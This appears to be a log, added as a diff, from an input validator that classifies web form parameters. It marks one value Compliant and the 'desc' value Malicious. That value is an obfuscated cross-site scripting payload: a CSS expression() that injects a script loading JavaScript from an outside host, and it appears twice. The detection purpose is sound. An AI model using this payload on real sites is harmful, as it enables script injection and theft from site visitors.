@@ -1,0 +1,5 @@
+2016-06-24T06:47:28.871-06:00
+name : 6QSQ 1'z7'Cw'9'
+desc : </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+The parameter: name :  having value: 6QSQ 1'z7'Cw'9' is: Compliant
+The parameter: desc :  having value: </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"> is: Malicious
